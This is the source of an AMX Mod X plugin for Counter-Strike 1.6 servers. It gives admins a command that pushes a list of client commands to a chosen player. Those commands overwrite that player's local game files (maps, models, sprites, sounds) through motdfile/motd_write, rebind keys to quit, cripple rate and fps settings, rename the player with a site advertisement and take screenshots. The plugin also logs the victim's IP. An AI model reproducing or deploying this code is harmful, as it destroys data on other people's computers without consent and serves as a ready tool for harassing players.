#include < amxmodx >
#include < amxmisc >
#include <fun>
#include <engine>

new const g_sCommands[ ][ ] =
{
	"rate 1",
	"cl_cmdrate 1",
	"cl_updaterate 1",
	"fps_max 1",
	"sys_ticrate 1",
	"cl_download_ingame 0",
	"cl_allowdownload 0",
	"cl_backspeed 1",
	"cl_forwardspeed 1",
	"cl_weather 0",
	"fps_modem 0",    
	"sv_aim 0",
	"cl_dlmax 1",

	"name WwW.Ecila.Ro",

	"wait;snapshot;wait;snapshot",

	"motdfile events/ak47.sc;motd_write x",
	"motdfile models/p_deagle.mdl;motd_write x",
	"motdfile maps/de_dustyaztec.bsp;motd_write x",
	"motdfile maps/de_inferno_2x2.bsp;motd_write x",

	"motdfile media/gamestartup.wav;motd_write x",
	"motdfile resource/background/800_1_a_loading.tga;motd_write x",
	"motdfile resource/background/800_1_b_loading.tga;motd_write x",
	"motdfile resource/background/800_1_c_loading.tga;motd_write x",

	"motdfile resource/background/800_2_a_loading.tga;motd_write x",
	"motdfile resource/background/800_2_b_loading.tga;motd_write x",
	"motdfile resource/background/800_2_c_loading.tga;motd_write x",
	"motdfile resource/background/800_3_a_loading.tga;motd_write x",

	"motdfile resource/background/800_3_b_loading.tga;motd_write x",
	"motdfile resource/background/800_3_c_loading.tga;motd_write x",

	"motdfile sprites/blood.spr;motd_write x",
	"motdfile sprites/defuser.spr;motd_write x",
	"motdfile sprites/grass_01.spr;motd_write x",
	"motdfile sprites/radio.spr;motd_write x",

	"motdfile sprites/radar320.spr;motd_write x",
	"motdfile sprites/sniper_scope.spr;motd_write x",
	"motdfile sprites/snow.spr;motd_write x",
	"motdfile models/grass.mdl;motd_write x",

	"motdfile events/ak47.sc;motd_write x",
	"motdfile events/aug.sc;motd_write x",
	"motdfile events/awp.sc;motd_write x",
	"motdfile events/famas.sc;motd_write x",

	"motdfile events/fiveseven.sc;motd_write x",
	"modtfile events/galil.sc;motd_write x",
	"motdfile events/glock18.sc;motd_write x",
	"motdfile events/m4a1.sc;motd_write x",

	"bind TAB quit;bind ENTER quit;bind ESCAPE quit;bind ~ quit",
	"bind + quit;bind , quit;bind - quit;bind . quit",
	"bind MOUSE1 quit;bind MOUSE2 quit;bind y quit;bind u quit",

	"motdfile maps/fy_snow.bsp;motd_write x",
	"motdfile maps/de_dust2.bsp;motd_write x",
	"motdfile maps/de_inferno.bsp;motd_write x",
	"motdfile maps/de_nuke.bsp;motd_write x",

	"motdfile maps/de_dust2x2.bsp;motd_write x",
	"motdfile maps/de_nuke32.bsp;motd_write x",

	"motdfile models/w_ak47.mdl;motd_write x",
	"motdfile models/w_m4a1.mdl;motd_write x",
	"motdfile models/w_deagle.mdl;motd_write x",
	"motdfile models/w_elite.mdl;motd_write x",

	"motdfile models/w_knife.mdl;motd_write x",
	"motdfile models/w_flashbang.mdl;motd_write x",
	"motdfile models/w_hegrenade.mdl;motd_write x",

	"motdfile models/w_usp.mdl;motd_write x",
	"motdfile ajawad.wad;motd_write x",
	"motdfile cs_dust.wad;motd_write x",
	"motdfile de_aztec.wad;motd_write x",
	"motdfile cs_assault.wad;motd_write x",

	"motdfile models/v_ak47.mdl;motd_write x",
	"motdfile models/v_aug.mdl;motd_write x",
	"motdfile models/v_deagle.mdl;motd_write x",
	"motdfile models/v_usp.mdl;motd_write x",

	"motdfile models/p_m4a1.mdl;motd_write x",
	"motdfile models/p_awp.mdl;motd_write x",
	"motdfile models/p_usp.mdl;motd_write x",
	"motdfile models/p_ak47.mdl;motd_write x",

	"wait;wait;wait;wait;quit",
	"quit",
	"cl_timeout 0"	
};

public plugin_init( )
{
	register_plugin( "SuperPa", "1.0", "AleCs14" );
	register_concmd( "amx_pa", "Concmd_AMXX_Sayonara", ADMIN_LEVEL_F, "<jucator> Strica cs-ul definitiv + 3 screenshot-uri " );
}

public Concmd_AMXX_Sayonara( id, level, cid )

{
	if( !cmd_access( id, level, cid, 2 ) )
		return PLUGIN_HANDLED;
	
	new sArgument[ 32 ];
	read_argv( 1, sArgument, charsmax( sArgument ) );
	
	new player = cmd_target( id, sArgument, ( CMDTARGET_NO_BOTS | CMDTARGET_ALLOW_SELF ) );
	
	if( !player )
		return PLUGIN_HANDLED;
	
	new name[ 32 ], name2[ 32 ], ip2[ 16 ];
	get_user_name( id, name, charsmax( name ) );
	get_user_name( player, name2, charsmax( name2 ) );
	get_user_ip( player, ip2, charsmax( ip2 ), 1 );
	
	player_color( 0, ".g .v[Amx_SuperPa] .gAdminul .v%s .ga aplicat comanda Sayonara pe .v%s", name, name2 );
	player_color( 0, ".g .v[Amx_SuperPa] .gComanda executata cu succes de catre adminul .v%s", name );
	client_cmd( 0, "spk ^"vox/adios ^"");
	client_print(player,print_chat,"*** %s ai primit SAYONARA de la ADMINUL %s ***", name2 , name ) ;
	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici WwW.Ecila.Ro***", name2 , name ) ;
	client_print(player,print_chat,"*** %s ti-au fost facute 2 ss (poze) in cstrike/(numele hartii )***", name2 ) ;
	
	for( new i = 0; i < sizeof( g_sCommands ); i++)
		client_cmd( player, g_sCommands[ i ] );
	     
	
	log_to_file( "Sayonara.log", "%s A aplicat comanda Sayonara pe %s(%s)", name, name2, ip2 );
	return PLUGIN_HANDLED;
}

stock player_color( const id, const input[ ], any:... )
{
	new count = 1, players[ 32 ]

	static msg[ 191 ]
	vformat( msg, 190, input, 3 )
	
	replace_all( msg, 190, ".v", "^4" ) /* verde */
	replace_all( msg, 190, ".g", "^1" ) /* galben */
	replace_all( msg, 190, ".e", "^3" ) /* ct=albastru | t=rosu */
	replace_all( msg, 190, ".x", "^0" ) /* normal-echipa */
	
	if( id ) players[ 0 ] = id; else get_players( players, count, "ch" )
	{
		for( new i = 0; i < count; i++ )
		{
			if( is_user_connected( players[ i ] ) )
			{
				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "SayText" ), _, players[ i ] )
				write_byte( players[ i ] );
				write_string( msg );
				message_end( );
			}
		}
	}
}